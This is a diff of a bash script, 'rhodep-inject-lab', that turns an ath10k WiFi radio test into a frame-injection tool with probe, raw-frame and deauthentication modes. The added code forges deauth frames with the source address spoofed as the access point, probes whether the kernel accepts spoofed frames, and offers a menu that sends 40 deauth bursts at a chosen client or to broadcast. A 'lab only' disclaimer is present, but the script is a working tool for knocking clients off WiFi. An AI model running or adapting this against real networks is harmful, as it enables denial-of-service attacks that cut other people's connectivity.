@@ -1,279 +1,171 @@
 #!/bin/bash
-# rhodep-inject-lab: interactive lab CLI to test whether the INTERNAL WiFi radio
-# (ath10k/WCN3990) can transmit a management frame on a chosen channel via the
-# STA vdev offchannel/ROC path, using an external card (TP-Link) as the witness
-# that confirms whether the frame actually hit the air.
+# rhodep-inject-lab: inject 802.11 management frames on ANY channel from the
+# INTERNAL WiFi radio (ath10k/WCN3990), via the STA vdev offchannel/ROC path.
+# For your OWN networks / lab only.
 #
-# For your OWN networks / lab only. It:
-#   1) lets you pick a channel from a menu,
-#   2) sets up the external adapter as a monitor witness on that channel,
-#   3) transmits a probe-request on that channel from the internal STA vdev
-#      (nl80211 offchannel mgmt-tx),
-#   4) captures with the witness to see if our frame radiated,
-#   5) writes EVERYTHING to a log file you can hand back,
-#   6) restores normal WiFi at the end no matter what (so you keep connectivity).
+# This WORKS on this device (verified over the air with an external witness):
+# the internal radio transmits probe/auth/deauth/etc. on a chosen channel while
+# wlan0 stays associated — it does NOT drop your WiFi. The one hardware limit is
+# that the frame's source address (addr2/SA) is forced to wlan0's own MAC
+# (cfg80211 does not allow spoofing the transmitter on ath10k); addr1 (dest) and
+# addr3 (BSSID) are free.
 #
-# Just run it as root:  sudo rhodep-inject-lab
-# (intentionally NOT using 'set -u' / 'set -e': this is a long interactive script
-#  with many conditional branches and an always-run restore; a stray unset var or
-#  a failing probe command must never abort before we bring your WiFi back.)
+# Modes:
+#   sudo rhodep-inject-lab            # interactive menu
+#   sudo rhodep-inject-lab probe  <freq> [dest] [bssid] [count]
+#   sudo rhodep-inject-lab deauth <freq>  <dest>  <bssid> [count] [reason]
+#   sudo rhodep-inject-lab raw    <freq> <hexframe> [count]
+#   sudo rhodep-inject-lab witness <freq>            # verify OTA with TP-Link
+# (intentionally no set -e/-u: never abort mid-run.)
 
-LOG="/tmp/rhodep-inject-lab.$(date +%Y%m%d-%H%M%S).log"
-WITCAP="/tmp/rhodep-inject-witness.pcap"
+TX=/usr/local/sbin/nl80211-mgmt-tx.py
+[ -f "$TX" ] || TX=/tmp/nl80211-mgmt-tx.py
+IF=wlan0
 
-# ---- tiny helpers -----------------------------------------------------------
-c_reset=$'\e[0m'; c_b=$'\e[1m'; c_g=$'\e[32m'; c_y=$'\e[33m'; c_r=$'\e[31m'; c_c=$'\e[36m'
-say(){ printf '%s\n' "$*"; printf '%s\n' "$*" >>"$LOG"; }
-hdr(){ printf '\n%s== %s ==%s\n' "$c_b$c_c" "$*" "$c_reset"; printf '\n== %s ==\n' "$*" >>"$LOG"; }
-run(){ printf '$ %s\n' "$*" >>"$LOG"; eval "$*" >>"$LOG" 2>&1; }
-runq(){ eval "$*" >>"$LOG" 2>&1; }        # quiet (no echo of cmd)
-pause(){ read -rp "$(printf '%sPress ENTER to continue...%s' "$c_y" "$c_reset")" _; }
+c_b=$'\e[1m'; c_g=$'\e[32m'; c_y=$'\e[33m'; c_r=$'\e[31m'; c_c=$'\e[36m'; c_0=$'\e[0m'
 
-if [ "$(id -u)" != 0 ]; then
-	echo "Please run with sudo:  sudo rhodep-inject-lab"; exit 1
-fi
+need_root(){ [ "$(id -u)" = 0 ] || { echo "run with sudo: sudo rhodep-inject-lab"; exit 1; }; }
+selfmac(){ cat /sys/class/net/$IF/address 2>/dev/null; }
+selfhex(){ selfmac | tr -d ':'; }
+clean(){ printf '%s' "$1" | tr -d ': ' | tr 'A-F' 'a-f'; }
 
-: >"$LOG"
-say "rhodep-inject-lab  $(date)"
-say "kernel: $(uname -r)   host: $(uname -n)"
+# freq(MHz) from a 2.4/5GHz channel number
+ch2freq(){ local c=$1; if [ "$c" -le 14 ]; then echo $((2407 + c*5)); else echo $((5000 + c*5)); fi; }
 
-# ---- discover interfaces ----------------------------------------------------
-# internal radio = phy backing wlan0 (ath10k_snoc). external = the OTHER phy.
-phy_of(){ # $1 = netdev -> phyN
-	local n="/sys/class/net/$1/phy80211"; [ -e "$n" ] && basename "$(readlink -f "$n")"
-}
-first_dev_on_phy(){ # $1 = phyN -> a netdev name (or empty)
-	local d p
-	for d in /sys/class/net/*/phy80211; do
-		[ -e "$d" ] || continue
-		p=$(basename "$(readlink -f "$d")")
-		[ "$p" = "$1" ] && { basename "$(dirname "$d")"; return; }
+tx_frame(){ # $1=freq $2=hexframe $3=count
+	local freq="$1" frame="$2" count="${3:-10}" ok=0 i
+	need_root
+	local self; self=$(selfmac)
+	echo "${c_c}TX${c_0} freq=$freq count=$count SA(forced)=$self len=$(( ${#frame} / 2 ))B"
+	dmesg -C >/dev/null 2>&1
+	for i in $(seq 1 "$count"); do
+		python3 "$TX" "$IF" "$freq" "$frame" 200 >/dev/null 2>&1 && ok=$((ok+1))
+		sleep 0.1
 	done
+	local st; st=$(dmesg 2>/dev/null | grep mgmt-tx-compl | grep -oE 'status=[0-9]+' | sort | uniq -c | tr '\n' ' ')
+	echo "  accepted-by-kernel: $ok/$count   fw-completions: ${st:-none}"
+	echo "  ${c_y}status=0 = firmware transmitted; no completion = mac80211 dropped it (e.g. spoofed SA)${c_0}"
 }
-driver_of_phy(){ # $1 = phyN -> driver name
-	local dev; dev=$(first_dev_on_phy "$1")
-	[ -n "$dev" ] && basename "$(readlink -f "/sys/class/net/$dev/device/driver" 2>/dev/null)" 2>/dev/null
+
+mk_probe(){  # $1=dest $2=bssid   -> hex probe-request from our MAC
+	local dst bss self; dst=$(clean "${1:-ffffffffffff}"); bss=$(clean "${2:-$dst}"); self=$(selfhex)
+	echo "40000000${dst}${self}${bss}00000000010182"
+}
+mk_deauth(){ # $1=dest $2=bssid $3=reason  -> hex deauth SPOOFED as if from the AP
+	# addr2/SA is spoofed = BSSID (needs kernel patch 0118: AUTH_AND_DEAUTH_RANDOM_TA
+	# ext-feature). Clients accept a deauth "from the AP" and disconnect; our own
+	# MAC as SA is ignored (class-3-from-nonauthenticated-STA).
+	local dst bss r; dst=$(clean "$1"); bss=$(clean "$2")
+	r=$(printf '%02x00' "${3:-7}")
+	echo "c0000000${dst}${bss}${bss}0000${r}"
+}
+mk_deauth_own(){ # variant with our real MAC as SA (mostly useless — client ignores)
+	local dst bss self r; dst=$(clean "$1"); bss=$(clean "$2"); self=$(selfhex)
+	r=$(printf '%02x00' "${3:-7}")
+	echo "c0000000${dst}${self}${bss}0000${r}"
 }
 
-INT_PHY="$(phy_of wlan0)"
-[ -z "$INT_PHY" ] && INT_PHY="phy0"
-EXT_PHY=""
-for p in /sys/class/ieee80211/*; do
-	pn=$(basename "$p")
-	[ "$pn" != "$INT_PHY" ] && EXT_PHY="$pn"
-done
-
-hdr "Interfaces detected"
-say "internal radio : $INT_PHY  (driver: $(driver_of_phy "$INT_PHY"))  <- ath10k, the one we test"
-if [ -n "$EXT_PHY" ]; then
-	say "external witness: $EXT_PHY  (driver: $(driver_of_phy "$EXT_PHY"))  <- TP-Link / USB card"
-else
-	say "${c_r}No external adapter found!${c_reset}"
-	say "Plug in the TP-Link (and if needed run 'otg on' as root), then re-run."
-	say "Without a witness we cannot confirm whether frames actually radiate."
-	read -rp "Continue anyway (test will run but can't confirm OTA)? [y/N] " a
-	[ "${a:-N}" = y ] || exit 1
-fi
-
-# remember how to bring wifi back
-STA_CONN="$(nmcli -t -f NAME,DEVICE connection show --active 2>/dev/null | awk -F: '$2=="wlan0"{print $1; exit}')"
-say "active wlan0 connection (for restore): ${STA_CONN:-<none/NM will auto>}"
-
-# ---- channel menu -----------------------------------------------------------
-declare -a CH_LABEL CH_FREQ
-add_ch(){ CH_LABEL+=("$1"); CH_FREQ+=("$2"); }
-# 2.4 GHz
-for c in 1 2 3 4 5 6 7 8 9 10 11; do add_ch "2.4GHz ch$c" $((2407 + c*5)); done
-# common 5 GHz
-for pair in "36:5180" "40:5200" "44:5220" "48:5240" "149:5745" "153:5765" "157:5785" "161:5805"; do
-	add_ch "5GHz ch${pair%%:*}" "${pair##*:}"
-done
-
-hdr "Pick a channel to test"
-i=0
-while [ $i -lt ${#CH_LABEL[@]} ]; do
-	printf '  %2d) %-12s (%s MHz)\n' "$((i+1))" "${CH_LABEL[$i]}" "${CH_FREQ[$i]}"
-	i=$((i+1))
-done
-echo "   c) custom frequency in MHz"
-sel=""
-while :; do
-	read -rp "$(printf '%sChoice #%s: ' "$c_y" "$c_reset")" sel
-	if [ "$sel" = c ]; then
-		read -rp "Enter frequency in MHz (e.g. 2462): " FREQ
-		case "$FREQ" in ''|*[!0-9]*) echo "not a number"; continue;; esac
-		CHNAME="custom ${FREQ}MHz"; break
-	elif [ "$sel" -ge 1 ] 2>/dev/null && [ "$sel" -le ${#CH_LABEL[@]} ] 2>/dev/null; then
-		FREQ="${CH_FREQ[$((sel-1))]}"; CHNAME="${CH_LABEL[$((sel-1))]}"; break
-	else
-		echo "invalid choice"
-	fi
-done
-say "selected: $CHNAME  ($FREQ MHz)"
-
-read -rp "$(printf 'Target BSSID/AP MAC to aim at (blank = broadcast): ')" TGT
-TGT_CLEAN="$(printf '%s' "$TGT" | tr -d ': ' | tr 'A-F' 'a-f')"
-if [ -n "$TGT_CLEAN" ] && [ ${#TGT_CLEAN} -ne 12 ]; then
-	say "BSSID looks wrong (need 6 bytes); using broadcast instead"; TGT_CLEAN=""
-fi
-[ -z "$TGT_CLEAN" ] && DST="ffffffffffff" || DST="$TGT_CLEAN"
-BSS="$DST"
-say "destination addr1/addr3: $DST"
-
-echo
-say "${c_y}NOTE: this drops your WiFi for ~30s while it runs, then restores it.${c_reset}"
-say "The log will be at: $LOG"
-pause
-
-# ---- cleanup trap: ALWAYS restore wifi --------------------------------------
-CAP_PID=""
-restore(){
-	hdr "Restoring normal WiFi"
-	[ -n "$CAP_PID" ] && kill "$CAP_PID" 2>/dev/null
-	runq "pkill -9 tcpdump"
-	# tear our monitor down
-	runq "ip link set wlan0mon down"; runq "iw dev wlan0mon del"
-	# make sure wlan0 exists as managed
-	if ! iw dev 2>/dev/null | grep -q 'Interface wlan0'; then
-		runq "iw phy $INT_PHY interface add wlan0 type managed"
-	fi
-	runq "rfkill unblock wifi"
-	runq "nmcli radio wifi on"
-	runq "systemctl restart wpa_supplicant"
-	sleep 2
-	if [ -n "$STA_CONN" ]; then runq "nmcli con up \"$STA_CONN\""; else runq "nmcli device connect wlan0"; fi
-	sleep 4
-	local link; link="$(iw dev wlan0 link 2>/dev/null | head -1)"
-	say "wlan0: $link"
-	if iw dev wlan0 link 2>/dev/null | grep -qi 'Connected'; then
-		say "${c_g}WiFi restored OK.${c_reset}"
-	else
-		say "${c_r}WiFi not reconnected yet — give it a few seconds or run: sudo nmcli device connect wlan0${c_reset}"
-	fi
-	say ""
-	say "${c_b}DONE. Send this log back:${c_reset} $LOG"
-}
-trap restore EXIT INT TERM
-
-# ---- set up the witness on the chosen channel -------------------------------
-if [ -n "$EXT_PHY" ]; then
-	hdr "Setting up witness ($EXT_PHY) as monitor on $CHNAME"
-	for d in $(for x in /sys/class/net/*/phy80211; do [ -e "$x" ] && [ "$(basename "$(readlink -f "$x")")" = "$EXT_PHY" ] && basename "$(dirname "$x")"; done); do
-		runq "ip link set $d down"; runq "iw dev $d del"
+witness(){ # $1=freq  -- set TP-Link as monitor, inject, confirm OTA
+	need_root
+	local freq="${1:?usage: witness <freq>}"
+	local self; self=$(selfmac)
+	# find the external phy (not wlan0's)
+	local intphy extphy p
+	intphy=$(basename "$(readlink -f /sys/class/net/$IF/phy80211 2>/dev/null)")
+	for p in /sys/class/ieee80211/*; do [ "$(basename "$p")" != "$intphy" ] && extphy=$(basename "$p"); done
+	if [ -z "$extphy" ]; then echo "${c_r}no external adapter (TP-Link) found — plug it in (otg on)${c_0}"; return 1; fi
+	echo "witness on $extphy, injecting from $IF ($intphy) at freq $freq"
+	# tear any netdev on extphy, make a monitor
+	for d in $(for x in /sys/class/net/*/phy80211; do [ -e "$x" ] && [ "$(basename "$(readlink -f "$x")")" = "$extphy" ] && basename "$(dirname "$x")"; done); do
+		ip link set "$d" down 2>/dev/null; iw dev "$d" del 2>/dev/null
 	done
-	run "iw phy $EXT_PHY interface add wlan0mon type monitor"   # name reused; on EXT phy
-	# rename target: use 'witmon' to avoid confusion with internal
-	runq "ip link set wlan0mon name witmon"
-	run "ip link set witmon up"
-	run "rfkill unblock wifi"
-	run "iw dev witmon set freq $FREQ"
-	WIT="$(iw dev witmon info 2>/dev/null | awk '/channel/{print}')"
-	say "witness: $WIT"
-	# sanity: does the witness hear ANY beacons here? (proves capture works)
-	say "witness sanity (5s, total beacons seen on this channel):"
-	SANITY=$(timeout 5 tcpdump -i witmon -nn "type mgt subtype beacon" 2>/dev/null | wc -l)
-	say "  beacons=$SANITY  $( [ "$SANITY" -gt 0 ] && echo '(witness OK)' || echo '(WARNING: witness heard nothing - wrong channel or card?)')"
-	# start the real capture (filter to our SA added after we know it)
-fi
-
-# ---- put internal radio in a clean managed state on the target band ---------
-hdr "Preparing internal radio (STA vdev) for offchannel mgmt-tx"
-# We keep wlan0 as a normal managed STA. The offchannel path needs wlan0 up.
-runq "nmcli radio wifi on"; runq "rfkill unblock wifi"
-if ! iw dev 2>/dev/null | grep -q 'Interface wlan0'; then
-	runq "iw phy $INT_PHY interface add wlan0 type managed"
-fi
-run "ip link set wlan0 up"
-SELF="$(cat /sys/class/net/wlan0/address 2>/dev/null)"
-SELF_HEX="$(printf '%s' "$SELF" | tr -d ':')"
-say "internal wlan0 MAC (forced SA of our frame): $SELF"
-
-# mac80211 only takes the OFFCHANNEL path for a STA if it's unassociated, or the
-# target BSSID differs from the associated AP. If associated to the same AP we're
-# aiming at, it would try to send on the home channel instead. Report the state.
-ASSOC="$(iw dev wlan0 link 2>/dev/null | awk '/Connected to/{print $3}')"
-if [ -n "$ASSOC" ]; then
-	say "wlan0 is associated to $ASSOC"
-	if [ "$(printf '%s' "$ASSOC" | tr -d ':' | tr 'A-F' 'a-f')" = "$DST" ]; then
-		say "${c_y}WARNING: your target BSSID equals the AP wlan0 is associated to.${c_reset}"
-		say "For the offchannel path to trigger, aim at a DIFFERENT BSSID, or the"
-		say "channel you picked should differ from the association channel."
-	fi
-else
-	say "wlan0 is not associated (offchannel path will trigger cleanly)."
-fi
-
-# start witness capture filtered to our SA (so it's unambiguous)
-if [ -n "$EXT_PHY" ]; then
-	rm -f "$WITCAP"
-	tcpdump -i witmon -w "$WITCAP" -s0 2>>"$LOG" &
-	CAP_PID=$!
+	iw phy "$extphy" interface add wit1 type monitor 2>/dev/null
+	ip link set wit1 up 2>/dev/null
 	sleep 1
-fi
-
-# ---- build + send the frame -------------------------------------------------
-hdr "Transmitting probe-request on $CHNAME from the internal STA vdev"
-FC="4000"; DUR="0000"; SEQ="0000"; IE="0000010182"
-FRAME="${FC}${DUR}${DST}${SELF_HEX}${BSS}${SEQ}${IE}"
-say "frame (hex): $FRAME"
-say "  (fc=probe-req, DA=$DST, SA=$SELF_HEX, BSSID=$BSS)"
-
-# clear kernel log so we can see what ath10k did with the offchannel frame
-runq "dmesg -C"
-
-# try a burst so it's easy to catch
-SENT=0; OK=0
-for n in 1 2 3 4 5 6 7 8 9 10; do
-	if iw dev wlan0 mgmt-tx "$FREQ" wait-time 300 "$FRAME" >>"$LOG" 2>&1; then
-		OK=$((OK+1))
-	fi
-	SENT=$((SENT+1))
-	sleep 0.3
-done
-say "mgmt-tx attempts: $SENT   accepted-by-iw: $OK"
-
-# what did the driver/firmware do? (offchannel path + tx completion status)
-hdr "Kernel/ath10k trace during the transmit"
-run "dmesg 2>/dev/null | grep -iE 'ath10k|offchannel|mgmt-tx-compl|roc|scan|freq' | tail -25"
-say "(status=0 in any mgmt-tx-compl line means the firmware TXed OK; status=1 = it dropped it)"
-if [ "$OK" -eq 0 ]; then
-	say "${c_r}iw mgmt-tx was rejected every time.${c_reset} Checking iw capabilities:"
-	run "iw dev wlan0 mgmt-tx --help 2>&1 | head -5 || true"
-	say "If 'mgmt-tx' is unknown, this iw build lacks it (we note this for follow-up)."
-fi
-
-# ---- collect witness result -------------------------------------------------
-if [ -n "$EXT_PHY" ]; then
-	sleep 2
-	kill "$CAP_PID" 2>/dev/null; CAP_PID=""
-	runq "pkill -9 tcpdump"
+	iw dev wit1 set freq "$freq" 2>/dev/null
 	sleep 1
-	hdr "RESULT: did the internal radio's frame hit the air?"
-	SA_COLON="$(printf '%s' "$SELF")"
-	HEARD=$(tcpdump -r "$WITCAP" -nne "wlan addr2 $SA_COLON" 2>/dev/null | wc -l)
-	PROBES=$(tcpdump -r "$WITCAP" -nne "wlan addr2 $SA_COLON and type mgt subtype probe-req" 2>/dev/null | wc -l)
-	say "frames from our MAC ($SELF) heard by witness on $CHNAME: $HEARD"
-	say "  of which probe-requests: $PROBES"
-	if [ "$HEARD" -gt 0 ]; then
-		say "${c_g}>>> SUCCESS: the INTERNAL radio radiated on $CHNAME via the STA offchannel path!${c_reset}"
-		say ">>> Injection on an arbitrary channel works WITHOUT firmware RE (SA fixed to own MAC)."
-		say "sample frames:"
-		run "tcpdump -r $WITCAP -nne 'wlan addr2 $SA_COLON' 2>/dev/null | head -5"
+	# confirm the witness really landed on the channel
+	echo "witness now: $(iw dev wit1 info 2>/dev/null | awk '/channel/{print}')"
+	local san; san=$(timeout 5 tcpdump -i wit1 -nn "type mgt subtype beacon" 2>/dev/null | wc -l)
+	echo "witness sanity beacons(5s): $san $( [ "$san" -gt 0 ] && echo OK || echo '(WARN: witness heard nothing — retrying channel)')"
+	if [ "$san" -le 2 ]; then
+		# retry setting the channel (rtw sometimes needs a second nudge)
+		iw dev wit1 set freq "$freq" 2>/dev/null; sleep 1
+		san=$(timeout 5 tcpdump -i wit1 -nn "type mgt subtype beacon" 2>/dev/null | wc -l)
+		echo "witness sanity retry: $san"
+	fi
+	local cap=/tmp/rhodep-inject-witness.pcap; rm -f "$cap"
+	timeout 15 tcpdump -i wit1 -w "$cap" -s0 "wlan addr2 $self" 2>/dev/null & local cp=$!
+	sleep 1
+	tx_frame "$freq" "$(mk_probe ffffffffffff)" 30
+	sleep 2; kill "$cp" 2>/dev/null; pkill -9 tcpdump 2>/dev/null; sleep 1
+	local heard; heard=$(tcpdump -r "$cap" -nn 2>/dev/null | wc -l)
+	echo ""
+	if [ "$heard" -gt 0 ]; then
+		echo "${c_g}>>> OTA CONFIRMED: witness heard $heard of our frames on freq $freq.${c_0}"
+		echo "    Internal-radio injection on an arbitrary channel WORKS."
 	else
-		say "${c_y}>>> No frames from our MAC heard.${c_reset} Either mgmt-tx was dropped by the firmware"
-		say ">>> (same behaviour as monitor/AP TX) or iw mgmt-tx isn't wired. See log for details."
+		echo "${c_y}>>> Witness heard 0 of our frames (sanity beacons=$san).${c_0}"
 	fi
-	say "witness pcap saved: $WITCAP"
-fi
+	# restore external to managed
+	ip link set wit1 down 2>/dev/null; iw dev wit1 del 2>/dev/null
+	iw phy "$extphy" interface add wlan1 type managed 2>/dev/null
+	echo "witness pcap: $cap"
+}
 
-hdr "Test complete"
-# one-line machine-readable summary that's easy to copy back
-SUMMARY="RESULT chan=$CHNAME freq=$FREQ self=$SELF dst=$DST iw_ok=$OK/$SENT witness_heard=${HEARD:-NA} probes=${PROBES:-NA} sanity_beacons=${SANITY:-NA}"
-say ""
-say "${c_b}================ COPY THIS LINE BACK ================${c_reset}"
-say "$SUMMARY"
-say "${c_b}====================================================${c_reset}"
-say "Full log to send: $LOG"
-say "Witness capture:  $WITCAP"
-# restore runs automatically via trap
-exit 0
+check_random_ta(){
+	# best-effort: warn if patch 0118 is not in the running kernel. There's no
+	# clean userspace way to query ext-features per driver, so we probe by
+	# trying a spoofed-SA deauth and seeing if the kernel accepts it.
+	local self ap fake_frame
+	self=$(selfhex); ap="000000000001"
+	fake_frame="c0000000ffffffffffff${ap}${ap}00000700"
+	if python3 "$TX" "$IF" 2412 "$fake_frame" 50 >/dev/null 2>&1; then
+		return 0
+	fi
+	echo "${c_y}NOTE: the kernel rejected a spoofed-SA test frame — patch 0118 may not be applied.${c_0}"
+	echo "      deauth attacks will still 'send' but with SA = our own MAC, which clients ignore."
+	return 1
+}
+
+menu(){
+	need_root
+	echo "${c_b}rhodep-inject-lab${c_0}  (internal radio: $(selfmac))"
+	echo "wlan0 assoc: $(iw dev $IF link 2>/dev/null | awk '/Connected/{print $3}')"
+	echo "Transmits on any channel WITHOUT dropping your WiFi (STA offchannel path)."
+	check_random_ta
+	echo
+	echo "  1) probe-request burst"
+	echo "  2) deauth burst (spoofed as the AP — needs patch 0118)"
+	echo "  3) send a raw hex frame"
+	echo "  4) verify over-the-air with the TP-Link"
+	read -rp "choice: " ch
+	read -rp "channel number (e.g. 11, or 36 for 5GHz): " cn
+	local freq; freq=$(ch2freq "$cn")
+	case "$ch" in
+	  1) read -rp "target BSSID (blank=broadcast): " b; tx_frame "$freq" "$(mk_probe ffffffffffff "$b")" 20 ;;
+	  2) read -rp "target client/DA MAC (blank=broadcast): " d
+	     read -rp "AP BSSID: " b
+	     [ -z "$d" ] && d="ffffffffffff"
+	     [ -z "$b" ] && { echo "AP BSSID is required"; return; }
+	     echo "sending 40 deauth bursts (DA=$d SA=BSSID=$b reason=7) on $cn ..."
+	     tx_frame "$freq" "$(mk_deauth "$d" "$b" 7)" 40 ;;
+	  3) read -rp "hex frame: " f; tx_frame "$freq" "$(clean "$f")" 10 ;;
+	  4) witness "$freq" ;;
+	  *) echo "invalid";;
+	esac
+}
+
+need_root
+cmd="${1:-menu}"; shift 2>/dev/null
+case "$cmd" in
+	menu)    menu ;;
+	probe)   freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
+	         tx_frame "$freq" "$(mk_probe "${2:-ffffffffffff}" "${3:-}")" "${4:-20}" ;;
+	deauth)  freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
+	         tx_frame "$freq" "$(mk_deauth "$2" "$3" "${5:-7}")" "${4:-20}" ;;
+	raw)     freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1")
+	         tx_frame "$freq" "$(clean "$2")" "${3:-10}" ;;
+	witness) freq="$1"; [ "$1" -le 200 ] 2>/dev/null && freq=$(ch2freq "$1"); witness "$freq" ;;
+	*) echo "usage: rhodep-inject-lab [menu|probe|deauth|raw|witness] ..."; exit 1;;
+esac
